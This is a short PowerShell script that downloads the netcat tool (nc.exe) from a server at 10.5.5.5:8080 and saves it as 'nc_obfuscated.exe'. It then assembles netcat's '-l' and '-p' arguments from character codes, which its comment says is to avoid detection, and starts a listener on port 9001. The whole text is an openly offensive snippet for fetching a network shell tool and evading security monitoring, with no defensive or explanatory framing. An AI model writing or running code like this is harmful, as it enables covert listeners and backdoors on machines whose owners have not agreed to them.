# Download nc.exe from the HTTP server
$ncUrl = "http://10.5.5.5:8080/nc.exe"
$ncFileName = "nc_obfuscated.exe"
Invoke-WebRequest -Uri $ncUrl -OutFile $ncFileName

# Obfuscate arguments to avoid detection
$arg1 = [char]45 + [char]108
$arg2 = [char]45 + [char]112
$port = "9001"

# Run nc.exe with obfuscated arguments
& .\$ncFileName $arg1 $arg2 $port
